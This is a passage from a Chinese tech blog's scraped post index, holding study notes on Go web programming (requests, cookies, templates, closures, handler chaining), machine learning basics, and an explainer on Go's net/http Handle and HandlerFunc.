Safari/537.36 Edg/94.0.992.47] ] 可以通过：\nr.Header[\u0026#34;key\u0026#34;] // or r.Header.Get(\u0026#34;key\u0026#34;) 拿到请求首部数据。\n请求主体 **一般的，GET请求没有Body内容，只有使用POST方式提交的请求才有Body。**而GET方式传递的数据放在URL中以键值对的形式进行传递。\n这是一个POST请求的Demo：\n请求中用户发送的数据是服务端所需要的。一般的，这些数据都是从表单中获取的。\n从表单中获取数据 需要注意的是，HTML表单的数据类型决定了POST在发送键值对时使用什么样的格式。\n值 描述 application/x-www-form-urlencoded 默认的，浏览器在发送前将所有提交的数据编码成长字符串，不同的键值对用“\u0026amp;”隔开，如：first_name=li\u0026amp;last_name=duo。这种编码更加简单和高效。 multipart/form-data 表单的数据转换成MIME报文。在使用包含文件上传控件的表单时，必须使用该值。 text/plain 空格转换为 \u0026ldquo;+\u0026rdquo; 加号，但不对特殊字符编码。 设r是一个http.Request，获取数据的方式有：\n关于文件 从Form中拿到文件需要r.ParseMultipartForm和r.MultipartForm.File来获取。\n服务器做出响应 服务器给客户端返回响应使用的是http.ResponseWriter，在创建响应时使用了http.response。\ntype ResponseWriter interface { Header() Header Write([]byte) (int, error) WriteHeader(statusCode int) } // http.response 是不可导出的 type response struct { conn *conn req *Request reqBody io.ReadCloser w *bufio.Writer handlerHeader Header calledHeader bool written int64 contentLength int64 status int ... } 这里有一个值得注意的地方：ServerHTTP中，为什么http.ResponseWriter传值，而http.Request是以指针引用方式传递的呢？\ntype Handler interface { ServeHTTP(ResponseWriter, *Request) } 首先，*http.Request使用指针传递引用是因为：服务器需要察觉我们对Request结构的修改，所以必须要传引用。那服务器不用察觉Response的修改吗？也用。\n所以，在http.ResponseWriter接口的实现response中，response是以引用传递的。可以理解为，http.ResponseWriter中是*response。所以实际上，传递的还是引用。\nfunc (w *response) Header() Header { if w.cw.header == nil \u0026amp;\u0026amp; w.wroteHeader \u0026amp;\u0026amp; !w.cw.wroteHeader { // Accessing the header between logically writing it // and physically writing it means we need to allocate // a clone to snapshot the logically written state. w.cw.header = w.handlerHeader.Clone() } w.calledHeader = true return w.handlerHeader } 可以看到，response在实现http.ResponseWriter接口时，是以引用的方式。\n有多种方法可以对ResponseWriter进行写入：\n// 使用 write 方法将数据写入 http Respons body中 func write(w http.ResponseWriter, r *http.Request) { str := \u0026#34;info\u0026#34; w.Write([]byte(str)) } // 对 Response header 进行设置 如状态码等信息 // @Notice:\tWriteHeader 执行完毕后 不允许再写入信息了 func header(w http.ResponseWriter, r *http.Request) { // 设置 Location 实现 重定向页面 w.Header().Set(\u0026#34;Location\u0026#34;, \u0026#34;https://lizonglin313.github.io/\u0026#34;) w.Header().Set(\u0026#34;A\u0026#34;, \u0026#34;aaa\u0026#34;) w.WriteHeader(302)\t// 写入状态码 } // 向响应中写入 JSON 格式的数据 // @Notice:\t要首先 使用 Header 将相应的内容 设置为 JSON 格式 func outputJSON(w http.ResponseWriter, r *http.Request) { w.Header().Set(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/json\u0026#34;) post := \u0026amp;Post{\t// Post 是一个实现打好 JSON Tag的结构体 User: \u0026#34;lzl\u0026#34;, Threads: []string{\u0026#34;1\u0026#34;, \u0026#34;2\u0026#34;, \u0026#34;3\u0026#34;}, } jsonByte, _ := json.Marshal(post) w.Write(jsonByte) } Cookie cookie常用于客户端持久化场景中，当客户端向服务器发出一个HTTP请求时，cookie会随着一起被发到服务器。\ntype Cookie struct { Name string Value string Path string // optional Domain string // optional Expires time.Time // optional RawExpires string // for reading cookies only // MaxAge=0 表示cookie在浏览器关闭后失效 // MaxAge\u0026lt;0 意味着cookie已经过期，客户端浏览器需要立马移除cookie // MaxAge\u0026gt;0 意味cookie可以存活多少秒 MaxAge int Secure bool HttpOnly bool SameSite SameSite Raw string Unparsed []string // Raw text of unparsed attribute-value pairs } 一般的，没有设置Expires的cookie成为会话cookie，这种cookie在浏览器关闭时被自动移除；相反的，设置了的cookie称为持久cookie。Expires明确指明cookie在什么时间点过期，而MaxAge则表示过多久cookie会过期。\n向浏览器设置cookie c1 = http.Cookie{...} c2 = http.Cookie{...} // 方法一：向Header中设置，注意第二个cookie需要你使用 Add 追加 w.Header().Set(\u0026#34;Set-Cookie\u0026#34;, c1.String()) w.Header().Add(\u0026#34;Set-Cookie\u0026#34;, c2.String()) // 方法二：使用http.SetCookie() 方法直接设置 // 这种设置多个cookie时就不需要 Add 了 http.SetCookie(w, \u0026amp;c1) 从浏览器获取cookie // 方法一：直接在Header拿 cookie := r.Header[\u0026#34;Cookie\u0026#34;] // 方法二：使用 Cookie(\u0026#34;key\u0026#34;) 方法，只能拿到cookie列表中的键值为 key 的cookie值 cookie, err := r.Cookie(\u0026#34;first_cookie\u0026#34;)\t// r.Cookie 返回一个 cookie 指针 // 方法三：使用 Cookies() 方法拿到cookie列表，获得所有cookie cs := r.Cookies()\t// r.Cookies 返回一个 cookie 的指针切片 闪现消息 上文中提到：cookie的MaxAge\u0026lt;0 意味着cookie已经过期，客户端浏览器需要立马移除cookie。通过这个性质可以实现类似弹出框的闪现消息。\n// 将 某个 cookie 的生存时间 置为 负 // 当再次请求这个处理器后，将找不到 cookie key func showMessage(w http.ResponseWriter, r *http.Request) { c, err := r.Cookie(\u0026#34;key\u0026#34;) if err != nil { if err == http.ErrNoCookie { fmt.Fprintln(w, \u0026#34;No message found!\u0026#34;) } } else { rc := http.Cookie{ Name: \u0026#34;key\u0026#34;, MaxAge: -1, Expires: time.Unix(1, 0), } http.SetCookie(w, \u0026amp;rc) fmt.Fprintln(w, `If you refresh the page, you\u0026#39;ll see \u0026#34;No message found!\u0026#34;`) } } 5. 内容展示 Go的模板引擎通过将数据和模板组合在一起，生成最终的HTML返回给浏览器。通常模板引擎有两种类型：\n无逻辑模板引擎：在模板中使用占位符，在填充数据时仅仅使用字符串替换。 嵌入逻辑的模板引擎：在模板中还会有逻辑代码，更灵活，更强大，能处理数据逻辑。 Go的模板引擎是介于无逻辑模板引擎和嵌入逻辑模板引擎之间的一种模板引擎。分别在text/template中和html/template中，来处理任意格式的文本数据和HTML格式。\n使用Go的Web模板需要两个步骤：\n对文本格式的模板进行语法分析，创建一个经过语法分析的模板结构。 将ResponseWriter和模板所需的动态数据传递给模板引擎，生成HTML，然后再返回给ResponseWriter。 例如：\nfunc process(w http.ResponseWriter, r *http.Request) { // 模板文件这里需要写路径，而且路径最前面不加 / t, _ := template.ParseFiles(\u0026#34;go_web_Sau/day2/template/templates/temp1.html\u0026#34;) // 生成数据 data := CreateData() // 将数据写到模板中 t.Execute(w, data) } 模板的语法分析 上面的代码中，执行了：\nt, _ := template.ParseFiles(\u0026#34;filepath\u0026#34;) 这实际上执行了两个动作，首先使用文件创建出一个新模板，然后再解析它：\nt := template.New(\u0026#34;filename\u0026#34;) t, _ := t.ParseFiles(\u0026#34;filepath\u0026#34;) 使用这种两步的方法需要注意的是：\nt := template.New(\u0026#34;temp6.html\u0026#34;).Funcs(funcMap) t, _ = t.ParseFiles(\u0026#34;go_web_Sau/day2/template/templates/temp6.html\u0026#34;) New()函数后面，只能跟模板名字，而ParseFiles()中需要的是从项目根路径开始的一个路径。\n其中，ParseFiles()可以接收多个文件名，但是这种情况下只会返回第一个文件的模板，至于其他的模板会放到一个映射里。\nGo的模板中，可以包含下面几种动作：\n条件动作，对传入的数据做条件判断 迭代动作，对数据进行遍历 设置动作，在模板中对数据赋值 包含动作，模板可以相互调用 此外，在模板中还可以使用：\n管道 为模板绑定函数 对于不同的如HTML语法、text格式进行上下文感知，例如对将Javascript脚本转译成可读字符串从而避免XSS攻击 更多关于Go template的内容：\nGo语言标准库之http/template | 李文周的博客 (liwenzhou.com)\n本部分内容的源码Demo-AdvancedGo/go_web_Sau/day2/template at main · lizonglin313/AdvancedGo (github.com)\n6. 存储数据 本书的存储模板主要是：\n内存存储 CSV存储 使用gob包进行二进制存储 使用数据库和数据库关系映射器 一般的，Web应用对于数据的存储有三种：\n将数据暂存到内存中 生成数据文件，将数据存入文件中 使用数据库进行持久化存储 内存存储 内存存储不需要访问磁盘，所以一般来说速度是最快的。但是内存存储的数据不是持久化的，在程序关闭后数据就会丢失。\n使用内存存储无非就是用Go的数据结构，如Array、Slice、Map等结构，也可使是扩展的Stack、Queue、Tree等。\n在使用内存存储，尤其涉及到数据修改的时候，要着重注意是传递指针引用还是直接传值。\nCSV（comma-separated value）存储 也就是逗号分隔符存储，像这样：\n使用CSV进行存储时，需要把数据转化成字符串：\nwriter := csv.NewWriter(csvFile) for _, post := range allPosts { line := []string{strconv.Itoa(post.Id), post.Content, post.Author}\t// 转换成字符串的切片 err := writer.Write(line)\t// 实际上写入一个buffer if err != nil { panic(err) } } writer.Flush()\t// 最后再将buffer写入文件 encoding/gob 这个包用于管理gob组成的流，这是一种在编码器和解码器之间进行交流的一种二进制数据。\nfunc store(data interface{}, filename string) { // 创建 缓冲区 buffer := new(bytes.Buffer) // 创建 编码器 向缓冲区写 encoder := gob.NewEncoder(buffer) // 编码数据 写道 缓冲区 data -\u0026gt; buffer err := encoder.Encode(data) if err != nil { panic(err) } // 将 缓冲区数据 写到 文件 err = ioutil.WriteFile(filename, buffer.Bytes(), 0600) if err != nil { panic(err) } } func load(data interface{}, filename string) { // 从 文件中 读取原始数据 raw, err := ioutil.ReadFile(filename) if err != nil { panic(err) } // 创建缓冲区 将原始数据写到缓冲区 raw -\u0026gt; buffer buffer := bytes.NewBuffer(raw) // 为 缓冲区 创建 解码器 dec := gob.NewDecoder(buffer) err = dec.Decode(data) if err != nil { panic(err) } } 数据库与关系映射器ORM Go对能见到的常用的数据库几乎都支持，并且有Gorm支持。\nGorm允许定义关系、实施数据迁移、串联多个查询以及执行其他的很多高级操作，还可以设置回调函数等。\nGORM中文文档：\nGORM 指南 | GORM - The fantastic ORM library for Golang, aims to be developer friendly.\n7. 发挥Go的并发优势 这部分内容会更新到我之前写的Go并发的博文中。\nGo的并发与任务控制 - Big Carrot (lizonglin313.github.io)\n","date":"2021-10-15T08:19:54+08:00","permalink":"https://lizonglingo.github.io/p/%E8%AF%BBgo-web%E7%BC%96%E7%A8%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0/","title":"读《Go Web编程》的一些笔记"},{"content":" 感觉今天应该是对匿名函数的使用开窍了😃\n概念 《Go语言圣经》\n使用匿名函数可以访问完整的词法环境，也就是在函数中定义的内部函数可以引用该函数的变量。\n// squares返回一个匿名函数。 // 该匿名函数每次被调用时都会返回下一个数的平方。 func squares() func() int { var x int return func() int {\t// 使用了上一行的变量x ，虽然x不是在这个匿名函数里定义的 x++ return x * x } } func main() { f := squares() fmt.Println(f()) // \u0026#34;1\u0026#34; fmt.Println(f()) // \u0026#34;4\u0026#34; fmt.Println(f()) // \u0026#34;9\u0026#34; fmt.Println(f()) // \u0026#34;16\u0026#34; } 函数squares返回另一个类型为func() int的函数。对squares的一次调用会生成一个局部变量x并返回一个匿名函数。每次调用匿名函数时，该函数都会先使x的值加1，再返回x的平方。第二次调用squares时，会生成第二个x变量，并返回一个新的匿名函数。新匿名函数操作的是第二个x变量。\nsquares的例子证明，函数值不仅仅是一串代码，还记录了状态。在squares中定义的匿名内部函数可以访问和更新squares中的局部变量，这意味着匿名函数和squares中，存在变量引用。这就是函数值属于引用类型和函数值不可比较的原因。Go使用闭包（closures）技术实现函数值，Go程序员也把函数值叫做闭包。\n通过这个例子，我们看到变量的生命周期不由它的作用域决定：squares返回后，变量x仍然隐式的存在于f中。这就是多次调用f()后，可以看到x的值是随上一次增长的，我们可以把x看作存在与f的变量，它们有相同的生命周期。\n外部函数对匿名函数的参数是指针传递的 Golang一般来说，全部是值传递；匿名函数除外，匿名函数接收一个指针。\n// 通常来讲，go是值传递的 // 但是闭包除外，它是引用传递 func errorUsing() { for i := 0; i \u0026lt; 3; i++ { defer func() { fmt.Println(i) }() } } func correctUsing() { for i := 0; i \u0026lt; 3; i+t+ { defer func(it int) {\t// 每次迭代用新的局部变量记录i的值 fmt.Println(it) }(i) } } func main() { errorUsing()\t// 3 3 3 correctUsing()\t// 2 1 0 } 函数errorUsing()中，执行了三次defer func()，使用指针传递i，所以是指向同一个地址的，对defer func()压栈后，出栈输出时，这个地址指向的i的值为3。因为栈底到栈顶的这三个defer func()的i是同一个地址，所以输出的值相同。\n函数correctUsing()每次调用defer func()，将传入的指向i的指针赋值了一份，传给形参it，所以拿到的it和i是两个不同的地址空间，同理，三次压栈的defer func()每个的参数it都是不同的地址空间，所以能把三个不同的i打印出来。\n使用匿名函数 **让函数带着参数走，不用显示的传参。**因为有些情况下，项目开发中很多函数已经定型了，如果某个地方需要新的参数，但是又不好修改函数声明，这时候就可以考虑使用匿名函数传值。\n这是我的一个理解，就像概念中的Demo，函数f()带着参数x走，而且不用显示的接收参数。\nDemo1-文件的Read和Close func doFile() { // 假设 我们定义一个方法，但是不用显示的使用 f // 就需要在 定义函数时 使用闭包 把 f 传进去 f, _ := os.OpenFile(\u0026#34;filename.txt\u0026#34;, os.O_RDWR|os.O_CREATE, 0755) // 通常的，匿名函数用来直接使用函数外的变量，利用的就是这一个特性 var ( Close = func() error { return (*os.File).Close(f)\t// 传入外部的 f } Read = func(data []byte) (int, error) { return (*os.File).Read(f, data)\t// 传入外部的 f } ) // 不再依赖 f，只要是个 *File 类型的都可以放 Read([]byte(\u0026#34;data\u0026#34;)) Close() } 可以看到，这里Read的声明是一个这样的函数：接收一个[]byte，返回一个(int, err)。\n而(*os.File).Read(f, data)中的Read是这样的：\n它是类型*File的一个方法，接收[]byte，返回int, err。使用时需要Read(f, data)两个参数。\n使用闭包将*File传入后，新的包装后的Read([]byte)只需要一个参数就行了，f已经隐式的包含在里面了。\nDemo2-依赖注入（串联http处理函数handlerFunc） 假设有这样一段：\nfunc main() { server := http.Server{ Addr : \u0026#34;127.0.0.1:8080\u0026#34;, } http.HandleFunc(\u0026#34;/post\u0026#34;, handleRequest) server.ListenAndServe() } // 一个多路复用器 func handleRequest(w http.ResponseWriter, r *http.Request) { var err error switch r.Method { case \u0026#34;GET\u0026#34;: err = handleGet(w, r) case \u0026#34;POST\u0026#34;: ... ... } } // 对应的处理函数 func handleGet(w http.ResponseWriter, r *http.Request) (err error) { ... } 如果，现在有这么一种需求，函数handleGet(w,r)多了一个参数需求，它想变成handleGet(w, r, t)，同时这个参数要在main()中传给handleRequest以便给后面所有从它复用出来的处理器使用。\n所以，有下面这种方法：\n// 一个 使用匿名函数返回 一个 多路复用器的函数 handleRequest func handleRequest(t Text) http.HandlerFunc { // 通过匿名函数 把 t 传进去 return func(w http.ResponseWriter, r *http.Request) { var err error switch r.Method { case \u0026#34;GET\u0026#34;: err = handleGet(w, r, t)\t// 可以使用t case \u0026#34;POST\u0026#34;: ... ... } } } func main() { t := \u0026amp;Text{...}\t// 创建T的实例 server := http.Server{ Addr : \u0026#34;127.0.0.1:8080\u0026#34;, } http.HandleFunc(\u0026#34;/post\u0026#34;, handleRequest(t))\t// line 1 // line 1 也就等同于下面这两行 // h := handleRequest(t) // http.HandleFunc(\u0026#34;/post\u0026#34;, h)\t// 为什么不是 h() 这个和 直接使用一个 handleFunc 是一个道理，不用加 () server.ListenAndServe() } 这里就使用了匿名函数，事先把它传给handleRequest(t Text)，从而没有影响http.HandleFunc()中需要调用的实现了ServerHTTP()的处理器。\n","date":"2021-10-11T20:22:15+08:00","permalink":"https://lizonglingo.github.io/p/go%E7%9A%84%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0%E9%97%AD%E5%8C%85/","title":"Go的匿名函数(闭包)"},{"content":"处理器和处理器函数 处理器是一个拥有ServeHTTP方法的接口\n接收两个参数：ResponseWriter接口和指向Request结构的指针\n也就是，形如ServeHTTP(http.ResponseWriter, *http.Request)就是一个处理器\n处理器函数是与处理器具有相同行为的函数，它们接收ResponseWriter和指向Request结构的指针作为参数\n更详细的：关于Handle、HandleFunc、Handler和HandlerFunc | ruomu (gitee.io)\n通过下面代码直观的感受：\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; ) // 处理器和处理器函数 type HelloHandler struct {}\t// 这是一个处理器 type WorldHandler struct {}\t// 同样的也是一个处理器 // 为它们定义动作，实现 Handler 中的 ServeHttp 方法 func (h *HelloHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, \u0026#34;Hello\u0026#34;) } func (h *WorldHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, \u0026#34;World!\u0026#34;) } // 使用处理器函数 处理请求 func helloFunc(w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, \u0026#34;hello function!\u0026#34;) } func main() { // 使用处理器 hello := HelloHandler{} world := WorldHandler{} server := http.Server{ Addr: \u0026#34;127.0.0.1:8080\u0026#34;, } // 直接绑定 处理器 http.Handle(\u0026#34;/hello\u0026#34;, \u0026amp;hello) http.Handle(\u0026#34;/world\u0026#34;, \u0026amp;world) // 使用 处理函数 http.HandleFunc(\u0026#34;/hellof\u0026#34;, helloFunc) server.ListenAndServe() } 实际上，golang中的HandlerFunc函数类型将带有正确签名的函数f转换成一个带有方法f的Handler，也就是说golang自动用这个处理器函数生成了一个处理器。\n但是，处理器函数并不能完全替代处理器，即使看起来整洁一些。\n串联多个处理器和处理器函数 先看代码：\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;reflect\u0026#34; \u0026#34;runtime\u0026#34; ) func hello(w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, \u0026#34;hello!\u0026#34;) } // // @Name:\tlog // @Desc: 记录一个handler function的日志 // @Param:\th // @Return:\thttp.HandlerFunc // @Notice: 使用 runtime.FuncForPC 获取正在调用系统日志，也就是该函数的一些信息 // func log(h http.HandlerFunc) http.HandlerFunc { // 使用匿名函数进行返回 return func(w http.ResponseWriter, r *http.Request) { name := runtime.FuncForPC(reflect.ValueOf(h).Pointer()).Name() fmt.Println(\u0026#34;Hanlder function called - \u0026#34; + name) h(w, r) } } // // @Name:\tmain // @Desc: 串联两个处理器函数 // @Notice: // func main() { server := http.Server{ Addr: \u0026#34;127.0.0.1:8080\u0026#34;, } // log 返回一个 handlerfunc 所以它满足类型 handler http.HandleFunc(\u0026#34;/hello\u0026#34;, log(hello)) server.ListenAndServe() } 利用go中函数式编程的特性，将不同的函数进行串联，上面的log()函数接收一个函数作为参数，返回另一个函数。也就可以说，这段代码将log()和hello()进行串联。\n再比如说，我们还需要使用一个protect()函数在调用传入的处理器之前去验证用户的身份，进行访问控制：\npackage chaining_func import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; ) type HelloHandler struct {} func (h HelloHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, \u0026#34;hello!\u0026#34;) } func log1(h http.Handler) http.Handler { // 这里的 http.HandlerFunc 将一个 Function 转换成 Handler return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { fmt.Printf(\u0026#34;Handler called - %T\\n\u0026#34;, h) h.ServeHTTP(w, r) }) } func protect(h http.Handler) http.Handler { return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { fmt.Println(\u0026#34;Do some protect...\u0026#34;) h.ServeHTTP(w, r) }) } func chainingHandlers() { server := http.Server{ Addr: \u0026#34;127.0.0.1:8080\u0026#34;, } hello := HelloHandler{} http.Handle(\u0026#34;/hello\u0026#34;, protect(log1(hello))) server.ListenAndServe() } 从上面两个代码中，对处理handlerfunc和handler都进行了演示。对于处理器和处理器函数的关系还是值得好好思考下的。\n函数 http.Server()：对服务器进行详细配置，比如请求读取操作和响应写入操作的超时时间、日志记录器、服务器地址、处理器、TLS配置、连接状态\u0026hellip; http.ListenAndServe()：配置服务器地址、处理器 http.ListenAndServeTLS()：使用SSL证书和服务器私钥配置https服务 关于路由 /hello和/hello/有什么区别：前者会准确的进行路径匹配、后者可以用前缀进行匹配 值得注意的问题点 GET和POST都可以发送表单，但是由于GET请求不会有请求主体，所以它的数据是包含在URL中传输的\n几种不同的拿字段的方式：\n","date":"2021-10-11T12:53:57+08:00","permalink":"https://lizonglingo.github.io/p/go-web%E5%9F%BA%E7%A1%80/","title":"Go Web基础"},{"content":"吴恩达ML学习笔记 机器学习定义 计算机从经验E中学习，解决任务T，进行某个性能度量P，通过P测定在T上的表现因经验E而提高。 机器学习分类 Supervised learning监督学习：教会计算机做某件事情 Unsupervised learning无监督学习：让计算机自己去学习 Reinforcement learning强化学习 Recommend systems推荐系统 ··· 监督学习 给算法一个数据集，这个数据集中包含了正确的答案，并告诉计算机什么是正确的、什么是错误的（或者说数据对应的明确标签）；算法的目的是让机器给出更多正确的答案。\n回归问题-regression 预测连续的数值属性。\n预测房价 单变量线性回归-Linear regression with one variable $$ Hypothesis：\th_{\\theta}(x)=\\theta_0+\\theta_1x $$\n$$ Parameters:\t\\theta_0,\\theta_1 $$\n$$ Cost Function:\tJ(\\theta_0,\\theta_1) = {1\\over2m}\\sum_{i=1}^m(h_{\\theta}(x^{(i)})-y^{(i)})^2 $$\n$$ Goal: minimize_{(\\theta_0,\\theta_1)}J(\\theta_0,\\theta_1) $$\n既然我们的目标是将代价函数最小化，那一个一个试参数将会非常麻烦。所以这里引入梯度函数，快速将代价函数J最小化。\n梯度下降算法-Gradient descent-Batch $$ 重复直至收敛：\\theta_j := \\theta_j - \\alpha\\frac{\\partial }{\\partial \\theta_j}J(\\theta_0,\\theta_1){,}{,}(for{,}{,}j=0{,}{,}and{,}{,}j=1) $$\n或者换一种表达方法(同样的要进行到收敛)： $$ \\theta_0 :=\\theta_0-\\alpha{1\\over m}\\sum_{i=1}^m(h_{\\theta}(x^{(i)})-y^{(i)}) $$\n$$ \\theta_1:=\\theta_1-\\alpha{1\\over m}\\sum_{i=1}^m(h_{\\theta}(x^{(i)})-y^{(i)})·x^{(i)} $$\n其中： $$ \\alpha $$ 表示学习率，也就是梯度下降时我们迈出多大的步子。越小则说明梯度下降的速率越缓慢，越大则说明梯度下降的速率越迅速。\n梯度下降是很常用的算法，它是一个一阶的最优化算法，不仅被用在线性回归上，还被用在众多的机器学习领域中。\n它可以解决更一般的问题。\nHave some function: $$ J(\\theta_0,\\theta_1,\\theta_2,\u0026hellip;,\\theta_n) $$ Want: $$ min_{(\\theta_0,\u0026hellip;,\\theta_n)}J(\\theta_0,\u0026hellip;,\\theta_n) $$ 特点：\n沿着不同路线下降，会有多个局部最优解，容易陷入局部最优化 多元线性回归模型及梯度下降算法 $$ Hypothesis:h_\\theta(x)=\\theta^Tx=\\theta_0x_0+\\theta_1x_1+\\theta_2x_2+···+\\theta_nx_n $$\n$$ Parameters:\\theta_0,\\theta_1,···,\\theta_n $$\n$$ Cost Function:J(\\theta_0,\\theta_1,···,\\theta_n)={1\\over2m}\\sum_{i=1}^m(h_{\\theta}(x^{(i)})-y^{(i)})^2 $$\n$$ GradientDescent:Repeat{\\theta_j:=\\theta_j-\\alpha\\frac{\\partial }{\\partial \\theta_j}J(\\theta_0,\\theta_1,···,\\theta_n)} $$\n将GradientDescent的偏导数展开，就是： $$ \\theta_j:=\\theta_j-\\alpha{1\\over m}\\sum_{i=1}^m(h_{\\theta}(x^{(i)})-y^{(i)})x^{(i)}_j $$\n处理梯度下降的常用技巧 特征缩放 如果一个问题有很多特征，这些特征的取值都处在一个相近的范围，那么梯度下降算法就能更快地收敛。\n特征缩放的目的是：将特征的取值约束到-1到+1的范围内。\n归一化 进行如下替换，让特征值具有为0的平均值： $$ x_i-\u0026gt;(x_i-\\mu_i) $$ 其中： $$ x_i:第i个特征 $$\n$$ \\mu_i:第i个特征x_i的平均值 $$\n然后用： $$ x_i-\\mu_i\\over s_i $$ 去替换特征值： $$ x_i $$ 其中： $$ s_i:特征x_i的规模或者说是取值范围 $$\n正规方程用来最小化代价函数 除了可以使用梯度下降法求解最优代价方程的θ，还可以使用最小化代价函数直接求解最优θ。 $$ \\theta = (X^TX)^{-1}X^Ty $$ 其中： $$ X：特征矩阵 $$\n$$ y:结果向量 $$\n如此得到的θ就可以将代价函数最小化。\n分类问题-classification 预测离散的数值属性。\n判断肿瘤良性与否 Logistic regression 有$h_\\theta(x)=g(\\theta^Tx)$；其中$g(z)={1\\over1+e^{-z}}$​​ ，又叫做\u0026quot;logistic function\u0026quot;或者“sigmoid function”。在这里\n$h_\\theta(x)$预测的是在参数$\\theta$、特征值$x$的条件下，$y=1$​的概率。\nLogistic regression 的 cost function 与上面回归模型不同是，在使用“logistic function”后，我们的$J(\\theta)$​代价函数的图像会变成“非凸”的，会存在多个局部最小值。所以我们想找一个只有一个最值的图像。这里引入逻辑回归的代价函数：\n整体的代价函数如下： $$ J(\\theta)={1\\over m}\\sum_{i=1}^mCost(h_\\theta(x)^{(i)},y^{(i)}) $$\n其中： $$ Cost(h_\\theta(x),y) = \\begin{cases} -log(h_\\theta(x)),,,if ,, y=1\\ -log(1-h_\\theta(x)),,,if ,, y=0\\ \\end{cases} $$ 这里需要注意：$y=0 ,, or ,, 1 ,, always$​\n所以，$Cost(h_\\theta(x),y)$又可以写成： $$ Cost(h_\\theta(x),y)=-ylog(h_\\theta(x))-(1-y)log(1-h_\\theta(x)) $$ 最终，新的代价函数$J(\\theta)$就是： $$ J(\\theta)=-{1\\over m}[\\sum_{i=1}^my^{(i)}log(h_\\theta(x^{(i)}))+(1-y^{(i)})log(1-h_\\theta(x^{(i)}))] $$ 接下来，我们仍希望去最小化代价函数，得到$min_\\theta J(\\theta)$。\n与上面回归问题相似，我们依旧使用梯度下降法： $$ Repeat{\\ \\theta_j:=\\theta_j-\\alpha\\frac{\\partial }{\\partial \\theta_j}J(\\theta) \\ simulataneously,,update,,all ,,\\theta_j} $$ 需要注意的是：这里的公式看似与前面相同，但是我们对$h_{\\theta}(x)$的定义发生了变化，所以这是完全不同的。\n无监督学习 给算法的数据集没有明确的目的和用途，也不清楚每个数据点的意义，让计算机从中找出某种结构（比如让机器能够将数据分成若干个”簇“），\n聚类算法-clustering algorithm 告诉算法，这有一堆数据，不知道这些数据是什么、不知道谁是什么类型、甚至不知道有哪些类型（当然也无法告诉机器什么是正确答案），让机器自动找出这些数据的结构并按照得到的结构类型将这些数据个体分成”簇“\nGoogle news genes自动分类 自动管理计算机集群 社会网络分析 星际数据分析 评估模型 过拟合-高方差：直接表现为训练误差大，同时交叉验证误差也很大 欠拟合-高偏差：直接表现为训练 误差较小，但是交叉验证误差很大 修正高方差(variance)问题：使用更多的训练样本、减少特征数量、增大正则化项系数$\\lambda$的值​​ 修正高偏差(bias)问题：增加样本数 或 增加多项式特征、减小正则化系数$\\lambda$的值 常见问题 过拟合问题 过拟合问题通常在变量过多时出现，在训练时的假设可以很好的拟合训练集，代价函数实际上很可能接近于甚至等于0，这样一来模型会千方百计的去拟合训练集，最终导致模型无法泛化到新的样本中。\n如何解决过拟合 减少特征的数量\n人工的去决定哪些特征变量是重要的。 使用模型选择算法，让算法去决定保留哪些特征变量。 这种方法的缺点是：会舍弃一些信息，尽管这些信息是有用的。\n正则化Regularization\n保持所有的特征变量，但是减少量级或者参数$\\theta$的大小。 这样就保留了所有特征变量，因为每一个变量都会对预测的模型产生或大或小的影响。 欠拟合问题 与过拟合相反。\n符号定义 $$ m：训练样本的数量 $$\n$$ x\u0026rsquo;s：输入变量，或者说是特征 $$\n$$ y\u0026rsquo;s：输出变量，也就是要预测的目标变量 $$\n$$ (x,y)：表示一个训练样本 $$\n$$ (x^{(i)},y^{(i)})：表示第i个训练样本 $$\n$$ h：假设函数(hypothesis)，接收x，尝试输出y $$\n$$ 假设函数h_{\\theta}(x)=\\theta_0+\\theta_1x，那么\\theta_0和\\theta_1叫做模型参数 $$\n","date":"2021-10-08T12:52:45+08:00","permalink":"https://lizonglingo.github.io/p/ml%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","title":"ML学习笔记"},{"content":" 这篇文章很大程度上解决了我对golang的net\\http中Handle、HandleFunc、Handler和HandlerFunc的疑惑，但是该博主的主站貌似不能正常访问了，所以进行转载，以便复习。\n转自：关于Handle、HandleFunc、Handler和HandlerFunc | ruomu (gitee.io)\n在go中，可以很简单实现一个http服务器。\n但是在使用过程中，遇到了一些容易使人迷惑的类型、接口或方法名。\n于是决定深入了解并记录一下它们的区别。\nps: 本文的前置知识是，需要对go中的面向对象和接口有一定的了解。\n我们可以这样创建一个http server\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; ) type Hello struct { name string } func (h Hello) ServeHTTP(w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, \u0026#34;hello %s\u0026#34;, h.name) } func indexHandler(w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, \u0026#34;hello world\u0026#34;) } func main() { http.HandleFunc(\u0026#34;/\u0026#34;, indexHandler) http.Handle(\u0026#34;/hello\u0026#34;, \u0026amp;Hello{\u0026#34;ruomu\u0026#34;}) http.ListenAndServe(\u0026#34;:8000\u0026#34;, nil) } 这时如果你访问 localhost:8080/ 会看到 hello world\n如果访问localhost:8080/hello会看到hello ruomu\nHandler 我们翻看源码net/http/server.go可以看到：\ntype Handler interface { ServeHTTP(ResponseWriter, *Request) } 所以所有实现了 ServeHTTP 方法的结构体创建出来的对象，都可以看做是一个Handler类型的对象。\nHandle 源码：\nfunc Handle(pattern string, handler Handler) { DefaultServeMux.Handle(pattern, handler) } 可以看到，第一个参数不用说了，是绑定的路由，第二个参数是一个 Handler类型的对象。\n再回头看前文的代码：\n... type Hello struct { name string } func (h Hello) ServeHTTP(w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, \u0026#34;hello %s\u0026#34;, h.name) } ... http.Handle(\u0026#34;/hello\u0026#34;, 